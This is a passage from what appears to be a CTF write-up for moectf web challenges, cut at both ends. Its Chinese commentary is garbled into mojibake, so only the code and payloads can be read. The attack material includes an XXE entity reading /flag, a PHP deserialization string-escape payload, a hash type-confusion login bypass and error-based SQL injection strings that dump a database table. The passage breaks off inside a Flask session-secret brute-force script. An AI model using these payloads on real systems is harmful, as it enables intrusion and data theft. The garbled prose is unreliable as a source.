username [\n<!ENTITY aaa SYSTEM \"file:///flag\"> ]>\n<xml><name>&aaa;</name></xml>\n```\n\nå€¼å¾—æ³¨æ„çš„æ˜¯è¦urlç¼–ç åæ‰“å…¥ ä¸ç„¶æ²¡ç»“æœ \n\n\n\n# å¤§æµ·æé’ˆ\n\n`?id=1`1-1000ç›´æ¥bpçˆ†ç ´å°±è¡Œäº† \n\n# å¤§æµ·æé’ˆ\n\nè¡¨é¢æ˜¯æ–‡ä»¶ä¸Šä¼ å…¶å®å°±æ˜¯æ–‡ä»¶åŒ…å« ç„¶åå°±æ˜¯hashå¤„ç†ç¼ºé™· æ•°ç»„ç»•è¿‡å°±è¡Œ ç»å…¸é¢˜å‹äº†\n\n# å¤ºå‘½åä¸‰æª\n\nä¸€é“ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸ nmæ–°ç”Ÿèµ›åšè¿™ä¸ªæ˜¯å§\n\nç»™äº†æºç :\n\n```python\n<?php\nhighlight_file(__FILE__);\n\nrequire_once('Hanxin.exe.php');\n\n$Chant = isset($_GET['chant']) ? $_GET['chant'] : 'å¤ºå‘½åä¸‰æª';\n\n$new_visitor = new Omg_It_Is_So_Cool_Bring_Me_My_Flag($Chant);\n\n$before = serialize($new_visitor);\n$after = Deadly_Thirteen_Spears::Make_a_Move($before);\necho 'Your Movements: ' . $after . '<br>';\n\ntry{\n    echo unserialize($after);\n}catch (Exception $e) {\n    echo \"Even Caused A Glitch...\";\n}\n?>\n<?php\n\nif (basename($_SERVER['SCRIPT_FILENAME']) === basename(__FILE__)) {\n    highlight_file(__FILE__);\n}\n\nclass Deadly_Thirteen_Spears{\n    private static $Top_Secret_Long_Spear_Techniques_Manual = array(\n        \"di_yi_qiang\" => \"Lovesickness\",\n        \"di_er_qiang\" => \"Heartbreak\",\n        \"di_san_qiang\" => \"Blind_Dragon\",\n        \"di_si_qiang\" => \"Romantic_charm\",\n        \"di_wu_qiang\" => \"Peerless\",\n        \"di_liu_qiang\" => \"White_Dragon\",\n        \"di_qi_qiang\" => \"Penetrating_Gaze\",\n        \"di_ba_qiang\" => \"Kunpeng\",\n        \"di_jiu_qiang\" => \"Night_Parade_of_a_Hundred_Ghosts\",\n        \"di_shi_qiang\" => \"Overlord\",\n        \"di_shi_yi_qiang\" => \"Letting_Go\",\n        \"di_shi_er_qiang\" => \"Decisive_Victory\",\n        \"di_shi_san_qiang\" => \"Unrepentant_Lethality\"\n    );\n\n    public static function Make_a_Move($move){\n        foreach(self::$Top_Secret_Long_Spear_Techniques_Manual as $index => $movement){\n            $move = str_replace($index, $movement, $move);\n        }\n        return $move;\n    }\n}\n\nclass Omg_It_Is_So_Cool_Bring_Me_My_Flag{\n\n    public $Chant = '';\n    public $Spear_Owner = 'Nobody';\n\n    function __construct($chant){\n        $this->Chant = $chant;\n        $this->Spear_Owner = 'Nobody';\n    }\n\n    function __toString(){\n        if($this->Spear_Owner !== 'MaoLei'){\n            return 'Far away from COOL...';\n        }\n        else{\n            return \"Omg You're So COOOOOL!!! \" . getenv('FLAG');\n        }\n    }\n}\n\n?>\n```\n\nå‘¢æˆ‘ä»¬çš„æœ€ç»ˆç›®çš„å°±æ˜¯æœ€åä¸€å—\n\n```python\n function __toString(){\n        if($this->Spear_Owner !== 'MaoLei'){\n            return 'Far away from COOL...';\n        }\n        else{\n            return \"Omg You're So COOOOOL!!! \" . getenv('FLAG');\n        }\n    }\n}\n```\n\nä½†æ˜¯æˆ‘ä»¬åªèƒ½getä¿®æ”¹Chantå€¼ ä¸èƒ½ä¿®æ”¹Spear_Owner\n\nå†çœ‹ä¸€çœ¼æœ‰ç»å…¸çš„å…ˆserialize åunserialize å¹¶ä¸”å…¶ä¸­è¿˜æœ‰å­—ç¬¦æ›¿æ¢çš„ æ‰€ä»¥ç›´æ¥å°±èƒ½æƒ³åˆ°æ˜¯ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸äº†\n\néœ€è¦å°†`\";s:11:\"Spear_Owner\";s:6:\"MaoLei\";}`ä¸€éƒ¨åˆ†å¡å…¥ä¸€å…±35ä¸ª\n\npayloadå¦‚ä¸‹\n\n```python\ndi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiang\";s:11:\"Spear_Owner\";s:6:\"MaoLei\";}\n```\n\n \n\n# signin\n\nç»™äº†æºç ï¼š\n\næœ‰ç‚¹ç³Šæ¶‚ ä¹‹åçœ‹çœ‹å…¶ä»–å¸ˆå‚…çš„wpç†è§£ä¸€ä¸‹å§ \n\nå‰é¢çš„ä¸€äº›å¤„ç†ç†è§£èµ·æ¥æœ‰ç‚¹ä¸æ‡‚\n\n```python\nfrom secrets import users, salt\nimport hashlib\nimport base64\nimport json\nimport http.server\n\nwith open(\"flag.txt\",\"r\") as f:\n    FLAG = f.read().strip()\n\ndef gethash(*items):\n    c = 0\n    for item in items:\n        if item is None:\n            continue\n        c ^= int.from_bytes(hashlib.md5(f\"{salt}[{item}]{salt}\".encode()).digest(), \"big\") # it looks so complex! but is it safe enough?\n    return hex(c)[2:]\n\nassert \"admin\" in users\nassert users[\"admin\"] == \"admin\"\n\nhashed_users = dict((k,gethash(k,v)) for k,v in users.items())\n\neval(int.to_bytes(0x636d616f686e69656e61697563206e6965756e63696165756e6320696175636e206975616e6363616361766573206164^8651845801355794822748761274382990563137388564728777614331389574821794036657729487047095090696384065814967726980153,160,\"big\",signed=True).decode().translate({ord(c):None for c in \"\\x00\"})) # what is it?\n\ndef decrypt(data:str):\n    for x in range(5):\n        data = base64.b64encode(data).decode() # ummm...? It looks like it's just base64 encoding it 5 times? truely?\n    return data\n\n__page__ = base64.b64encode(\"PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICAgIDx0aXRsZT5zaWduaW48L3RpdGxlPgogICAgPHNjcmlwdD4KICAgICAgICBbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoK3t9K1tdKVsrISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKFtdK3t9KVshK1tdKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rW11bKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dWyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoW10re30pWyshIVtdXSsoW11bW11dK1tdKVsrISFbXV0rKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbK1tdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXV0oKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdW1tdXStbXSlbK1tdXSsoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXVtbXV0rW10pWytbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKygre30rW10pWyshIVtdXSsoW10rW11bKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dWyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoW10re30pWyshIVtdXSsoW11bW11dK1tdKVsrISFbXV0rKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbK1tdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXV0oKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdW1tdXStbXSlbK1tdXSsoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW11dKyghW10rW10pWyErW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKygre30rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSkoIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10pKVshK1tdKyEhW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKSghK1tdKyEhW10rISFbXSshIVtdKShbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKyghW10rW10pWyErW10rISFbXSshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCt7fStbXSlbKyEhW11dKyhbXStbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKCFbXStbXSlbIStbXSshIVtdXSsoW10re30pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCt7fStbXSlbKyEhW11dKyghIVtdK1tdKVsrW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKSghK1tdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSkpWyErW10rISFbXSshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0pKCErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10pKChbXSt7fSlbK1tdXSlbK1tdXSsoIStbXSshIVtdKyEhW10rW10pKyhbXVtbXV0rW10pWyErW10rISFbXV0pKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdK3t9KVshK1tdKyEhW11dKyghIVtdK1tdKVsrW11dKyhbXSt7fSlbKyEhW11dKygre30rW10pWyshIVtdXSkoIStbXSshIVtdKyEhW10rISFbXSkKICAgICAgICB2YXIgXzB4ZGI1ND1bJ3N0cmluZ2lmeScsJ2xvZycsJ3Bhc3N3b3JkJywnL2xvZ2luJywnUE9TVCcsJ2dldEVsZW1lbnRCeUlkJywndGhlbiddO3ZhciBfMHg0ZTVhPWZ1bmN0aW9uKF8weGRiNTRmYSxfMHg0ZTVhOTQpe18weGRiNTRmYT1fMHhkYjU0ZmEtMHgwO3ZhciBfMHg0ZDhhNDQ9XzB4ZGI1NFtfMHhkYjU0ZmFdO3JldHVybiBfMHg0ZDhhNDQ7fTt3aW5kb3dbJ2FwaV9iYXNlJ109Jyc7ZnVuY3Rpb24gbG9naW4oKXtjb25zb2xlW18weDRlNWEoJzB4MScpXSgnbG9naW4nKTt2YXIgXzB4NWYyYmViPWRvY3VtZW50W18weDRlNWEoJzB4NScpXSgndXNlcm5hbWUnKVsndmFsdWUnXTt2YXIgXzB4NGZkMjI2PWRvY3VtZW50W18weDRlNWEoJzB4NScpXShfMHg0ZTVhKCcweDInKSlbJ3ZhbHVlJ107dmFyIF8weDFjNjFkOT1KU09OW18weDRlNWEoJzB4MCcpXSh7J3VzZXJuYW1lJzpfMHg1ZjJiZWIsJ3Bhc3N3b3JkJzpfMHg0ZmQyMjZ9KTt2YXIgXzB4MTBiOThlPXsncGFyYW1zJzphdG9iKGF0b2IoYXRvYihhdG9iKGF0b2IoXzB4MWM2MWQ5KSkpKSl9O2ZldGNoKHdpbmRvd1snYXBpX2Jhc2UnXStfMHg0ZTVhKCcweDMnKSx7J21ldGhvZCc6XzB4NGU1YSgnMHg0JyksJ2JvZHknOkpTT05bXzB4NGU1YSgnMHgwJyldKF8weDEwYjk4ZSl9KVtfMHg0ZTVhKCcweDYnKV0oZnVuY3Rpb24oXzB4Mjk5ZDRkKXtjb25zb2xlW18weDRlNWEoJzB4MScpXShfMHgyOTlkNGQpO30pO30KICAgIDwvc2NyaXB0Pgo8L2hlYWQ+Cjxib2R5PgogICAgPGgxPmV6U2lnbmluPC9oMT4KICAgIDxwPlNpZ24gaW4gdG8geW91ciBhY2NvdW50PC9wPgogICAgPHA+ZGVmYXVsdCB1c2VybmFtZSBhbmQgcGFzc3dvcmQgaXMgYWRtaW4gYWRtaW48L3A+CiAgICA8cD5Hb29kIEx1Y2shPC9wPgoKICAgIDxwPgogICAgICAgIHVzZXJuYW1lIDxpbnB1dCBpZD0idXNlcm5hbWUiPgogICAgPC9wPgogICAgPHA+CiAgICAgICAgcGFzc3dvcmQgPGlucHV0IGlkPSJwYXNzd29yZCIgdHlwZT0icGFzc3dvcmQiPgogICAgPC9wPgogICAgPGJ1dHRvbiBpZCA9ICJsb2dpbiI+CiAgICAgICAgTG9naW4KICAgIDwvYnV0dG9uPgo8L2JvZHk+CjxzY3JpcHQ+CiAgICBjb25zb2xlLmxvZygiaGVsbG8/IikKICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJsb2dpbiIpLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgbG9naW4pOwo8L3NjcmlwdD4KPC9odG1sPg==\")\n\nclass MyHandler(http.server.BaseHTTPRequestHandler):\ndef do_GET(self):\ntry:\nif self.path == \"/\":\nself.send_response(200)\nself.end_headers()\nself.wfile.write(__page__)\nelse:\nself.send_response(404)\nself.end_headers()\nself.wfile.write(b\"404 Not Found\")\nexcept Exception as e:\nprint(e)\nself.send_response(500)\nself.end_headers()\nself.wfile.write(b\"500 Internal Server Error\")\n\ndef do_POST(self):\ntry:\nif self.path == \"/login\":\nbody = self.rfile.read(int(self.headers.get(\"Content-Length\")))\npayload = json.loads(body)\nparams = json.loads(decrypt(payload[\"params\"]))\nprint(params)\nif params.get(\"username\") == \"admin\":\nself.send_response(403)\nself.end_headers()\nself.wfile.write(b\"YOU CANNOT LOGIN AS ADMIN!\")\nprint(\"admin\")\nreturn\nif params.get(\"username\") == params.get(\"password\"):\nself.send_response(403)\nself.end_headers()\nself.wfile.write(b\"YOU CANNOT LOGIN WITH SAME USERNAME AND PASSWORD!\")\nprint(\"same\")\nreturn\nhashed = gethash(params.get(\"username\"),params.get(\"password\"))\nfor k,v in hashed_users.items():\nif hashed == v:\ndata = {\n\"user\":k,\n\"hash\":hashed,\n\"flag\": FLAG if k == \"admin\" else \"flag{YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG}\"\n}\nself.send_response(200)\nself.end_headers()\nself.wfile.write(json.dumps(data).encode())\nprint(\"success\")\nreturn\nself.send_response(403)\nself.end_headers()\nself.wfile.write(b\"Invalid username or password\")\nelse:\nself.send_response(404)\nself.end_headers()\nself.wfile.write(b\"404 Not Found\")\nexcept Exception as e:\nprint(e)\nself.send_response(500)\nself.end_headers()\nself.wfile.write(b\"500 Internal Server Error\")\n\nif __name__ == \"__main__\":\nserver = http.server.HTTPServer((\"\", 9999), MyHandler)\nserver.serve_forever()\n```\n\nç™»å½•é€»è¾‘\n\n```javascript\nif self.path == \"/login\":\n                body = self.rfile.read(int(self.headers.get(\"Content-Length\")))\n                payload = json.loads(body)\n                params = json.loads(decrypt(payload[\"params\"]))\n                print(params)\n                if params.get(\"username\") == \"admin\":\n                    self.send_response(403)\n                    self.end_headers()\n                    self.wfile.write(b\"YOU CANNOT LOGIN AS ADMIN!\")\n                    print(\"admin\")\n                    return\n                if params.get(\"username\") == params.get(\"password\"):\n                    self.send_response(403)\n                    self.end_headers()\n                    self.wfile.write(b\"YOU CANNOT LOGIN WITH SAME USERNAME AND PASSWORD!\")\n                    print(\"same\")\n                    return\n                hashed = gethash(params.get(\"username\"),params.get(\"password\"))\n                for k,v in hashed_users.items():\n                    if hashed == v:\n                        data = {\n                            \"user\":k,\n                            \"hash\":hashed,\n                            \"flag\": FLAG if k == \"admin\" else \"flag{YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG}\"\n                        }\n                        self.send_response(200)\n                        self.end_headers()\n                        self.wfile.write(json.dumps(data).encode())\n                        print(\"success\")\n                        return\n                self.send_response(403)\n                self.end_headers()\n                self.wfile.write(b\"Invalid username or password\")\n```\n\nç¡®è®¤äº†jsoné‡Œusernameå’Œpasswordä¸èƒ½ç›¸åŒåï¼Œç»è¿‡ä¸€ä¸ªhashå‡½æ•°\n\n```javascript\ndef gethash(*items):\n    c = 0\n    for item in items:\n        if item is None:\n            continue\n        c ^= int.from_bytes(hashlib.md5(f\"{salt}[{item}]{salt}\".encode()).digest(), \"big\") # it looks so complex! but is it safe enough?\n    return hex(c)[2:]\n```\n\nè¿™ä¸€å¨å¤„ç†æ˜¯æ¶ˆé™¤äº†ç±»å‹é™åˆ¶ï¼Œå› æ­¤ä½¿ç”¨ä¸åŒç±»å‹çš„usernameå’Œpasswordå³å¯\n\n```\n{\"username\": \"1\", \"password\": 1}\n```\n\nç»è¿‡decryptå‡½æ•°çš„äº”æ¬¡base64åpost\n\n```plain\nPOST /login HTTP/1.1\nHost: localhost:59959\nContent-Length: 157\nsec-ch-ua: \nsec-ch-ua-platform: \"\"\nsec-ch-ua-mobile: ?0\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.91 Safari/537.36\nContent-Type: text/plain;charset=UTF-8\nAccept: */*\nOrigin: http://localhost:59959\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: http://localhost:59959/\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nConnection: close\n\n{\"params\":\"VjJ4b2MxTXdNVmhVV0d4WFltMTRjRmxzVm1GTlJtUnpWR3R3VDJGNlJsWlZNV2gzVkZaRmQyTkVUbGhXYldoUVdsY3hVbVZWT1ZsaVIwWlNUVWR6ZVZVeFpIZFNiVlpXVFZSV1ZHRnRjems9\"}\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1692179475244-11f233f9-1301-45b6-aca4-1592f4ae426b.png)\n\n# å‡ºå»æ—…æ¸¸çš„å¿ƒæµ·\n\næŠ“åŒ…å¯ä»¥å‘ç°ä¸€ä¸ªè·¯ç”±`wp-content/plugins/visitor-logging/logger.php`\n\nè·å¾—æºç \n\n```javascript\n<?php\n/*\nPlugin Name: Visitor auto recorder\nDescription: Automatically record visitor's identification, still in development, do not use in industry environment!\nAuthor: KoKoMi\n  Still in development! :)\n*/\n\n// ä¸è®¸å·çœ‹ï¼è¿™äº›ä»£ç æˆ‘è¿˜åœ¨è°ƒè¯•å‘¢ï¼\nhighlight_file(__FILE__);\n\n// åŠ è½½æ•°æ®åº“é…ç½®ï¼Œæš‚æ—¶ç”¨ç¡¬ç¼–ç ç»å¯¹è·¯å¾„\nrequire_once('/var/www/html/wordpress/' . 'wp-config.php');\n\n$db_user = DB_USER; // æ•°æ®åº“ç”¨æˆ·å\n$db_password = DB_PASSWORD; // æ•°æ®åº“å¯†ç \n$db_name = DB_NAME; // æ•°æ®åº“åç§°\n$db_host = DB_HOST; // æ•°æ®åº“ä¸»æœº\n\n// æˆ‘è®°å¾—å¯ä»¥ç”¨wpæä¾›çš„global $wpdbæ¥æ“ä½œæ•°æ®åº“ï¼Œç­‰æ—…æ¸¸å›æ¥å†ç ”ç©¶ä¸€ä¸‹\n// è¿™äº›æ˜¯ä¸´æ—¶çš„ä»£ç \n\n$ip = $_POST['ip'];\n$user_agent = $_POST['user_agent'];\n$time = stripslashes($_POST['time']);\n\n$mysqli = new mysqli($db_host, $db_user, $db_password, $db_name);\n\n// æ£€æŸ¥è¿æ¥æ˜¯å¦æˆåŠŸ\nif ($mysqli->connect_errno) {\n    echo 'æ•°æ®åº“è¿æ¥å¤±è´¥: ' . $mysqli->connect_error;\n    exit();\n}\n\n$query = \"INSERT INTO visitor_records (ip, user_agent, time) VALUES ('$ip', '$user_agent', $time)\";\n\n// æ‰§è¡Œæ’å…¥\n$result = mysqli_query($mysqli, $query);\n\n// æ£€æŸ¥æ’å…¥æ˜¯å¦æˆåŠŸ\nif ($result) {\n    echo 'æ•°æ®æ’å…¥æˆåŠŸ';\n} else {\n    echo 'æ•°æ®æ’å…¥å¤±è´¥: ' . mysqli_error($mysqli);\n}\n\n// å…³é—­æ•°æ®åº“è¿æ¥\nmysqli_close($mysqli);\n\n//gptçœŸå¥½ç”¨\n```\n\ntimeå¤„å¯ä»¥è¿›è¡Œsqlæ³¨å…¥\n\nè¿™é‡Œæˆ‘ç”¨çš„æ˜¯æŠ¥é”™æ³¨å…¥\n\n```javascript\n1 and extractvalue(1,concat(0x7e,user(),0x7e,database()))\n1 and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))\n#secret_of_kokomi,visitor_record çˆ†åº“\n1 and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='secret_of_kokomi')))\n#id,content çˆ†å­—æ®µ\n1 and extractvalue(1,concat(0x7e,(select group_concat(id,content) from secret_of_kokomi))) çˆ†å†…å®¹\n1 and extractvalue(1,concat(0x7e,(mid((select group_concat(id,content) from secret_of_kokomi),47,70))))\né€‚å½“æ‹¼æ¥å³å¯\nmoectf{Dig_Thr0ugh_Eve2y_C0de\nThr0ugh_Eve2y_C0de_3nd_Poss1bIl\ne2y_C0de_3nd_Poss1bIlIti3s!!}\n```\n\nå°±æ˜¯æœ‰ä¸€ä¸ªé—®é¢˜è¿™é‡ŒæŠ¥é”™æ³¨å…¥æœ€åflagæ˜¾ç¤ºä¸å‡ºæ¥ è¦ç”¨midå‡½æ•°å»é€‚å½“çš„è°ƒæ•´ å½“æ—¶å°±æ˜¯æ ½äº†è·Ÿå¤´\n\nè¿˜æœ‰ä¸€ç§å°±æ˜¯ç›´æ¥`(user())`è¿›è¡ŒæŸ¥è¯¢å°±è¡Œ ã€‚ã€‚ã€‚\n\n# moworld\n\nä¸€é“å¾ˆç»¼åˆè€ƒå¯Ÿå†…ç½‘æ¸—é€çš„é¢˜ç›® éå¸¸çš„ä¸é”™ å¯ä»¥å­¦åˆ°å¾ˆå¤šçŸ¥è¯†\n\nå‹ç¼©åŒ…å¯†ç ä¸ºä¸Šä¸€é¢˜çš„flag\n\né¦–å…ˆæ˜¯ä¸€ä¸ªflaskæ¡†æ¶ ç»™äº†æç¤ºéœ€è¦æˆ‘ä»¬å»ä¼ªé€ session\n\n```javascript\nè®°å½•ä¸€ä¸‹æ­å»ºç•™è¨€æ¿çš„è¿‡ç¨‹\né¦–å…ˆç¡®å®šå¥½webæ¡†æ¶ï¼Œç¬”è€…é€‰æ‹©ä½¿ç”¨ç®€å•çš„flaskæ¡†æ¶ã€‚\nç„¶åä½¿ç”¨å¼ºä¸”éšæœºçš„å­—ç¬¦ä¸²ä½œä¸ºsessionçš„å¯†é’¥ã€‚\napp.secret_key = \"This-random-secretKey-you-can't-get\" + os.urandom(2).hex()\næœ€åå†å†™ä¸€ä¸‹è·¯ç”±å’Œæ•°æ®åº“å¤„ç†çš„å‡½æ•°å°±å®Œæˆå•¦ï¼ï¼\nèº«ä¸ºwebæ‰‹çš„æˆ‘ä¸ºäº†ä¿æŠ¤å¥½æœåŠ¡å™¨ï¼Œå†™ä»£ç çš„æ—¶å€™ååˆ†è°¨æ…ï¼Œä¸€å®šä¸ä¼šè®©æœ‰å¿ƒäººæœ‰å¯ä¹˜ä¹‹æœºï¼\n```\n\nå¯ä»¥çœ‹åˆ°sessionçš„æ„æˆ ç„¶åå»ç½‘ä¸Šæ‰¾äº†ä¸‹ å‘ç°æ˜¯æŸæ¬¡çš„ç¾å›¢CTFä¸Šçš„é¢˜ç›®\n\nç›´æ¥æ‹¿æ¥è„šæœ¬ç”¨å³å¯\n\n```javascript\n# -*- coding: utf-8 -*-\n# @Time : 2022/9/17 9:11\n# @Author : pysnow\nimport os\n\n# standard imports\nimport sys\nimport zlib\nfrom itsdangerous import base64_decode\nimport ast\n\n# Abstract Base Classes (PEP 3119)\nif sys.version_info[0] < 3:  # < 3.0\n    raise Exception('Must be using at least Python 3')\nelif sys.version_info[0] == 3 and sys.version_info[1] < 4:  # >= 3.0 && < 3.4\n    from abc import ABCMeta, abstractmethod\nelse:  # > 3.4\n    from abc import ABC, abstractmethod\n\n# Lib for argument parsing\nimport argparse\n\n# external Imports\nfrom flask.sessions import SecureCookieSessionInterface\n\n\nclass MockApp(object):\n\n    def __init__(self, secret_key):\n        self.secret_key = \"This-random-secretKey-you-can't-get\"+secret_key\n\n\nclass FSCM(ABC):\n    def encode(secret_key, session_cookie_structure):\n        \"\"\" Encode a Flask session cookie \"\"\"\n        try:\n            app = MockApp(secret_key)\n\n            session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))\n            si = SecureCookieSessionInterface()\n            s = si.get_signing_serializer(app)\n\n            return s.dumps(session_cookie_structure)\n        except Exception as e:\n            return \"[Encoding error] {}\".format(e)\n            raise e\n\n    def decode(session_cookie_value, secret_key=None):\n        \"\"\" Decode a Flask cookie  \"\"\"\n        try:\n            if (secret_key == None):\n                compressed = False\n                payload = session_cookie_value\n\n                if payload.startswith('.'):\n                    compressed = True\n                    payload = payload[1:]\n\n                data = payload.split(\".\")[0]\n\n                data = base64_decode(data)\n                if compressed:\n                    data = zlib.decompress(data)\n\n                return data\n            else:\n                app = MockApp(secret_key)\n\n                si = SecureCookieSessionInterface()\n                s = si.get_signing_serializer(app)\n\n                return s.loads(session_cookie_value)\n        except Exception as e:\n            return \"[Decoding error] {}\".format(e)\n            raise e\n\n\ndic = '0123456789abcdef'\nif __name__ == '__main__':\n    for i in dic:\n        for j in dic:\n            for k in dic:\n                for l in dic:\n                    key = i + j + k + l\n                    res = 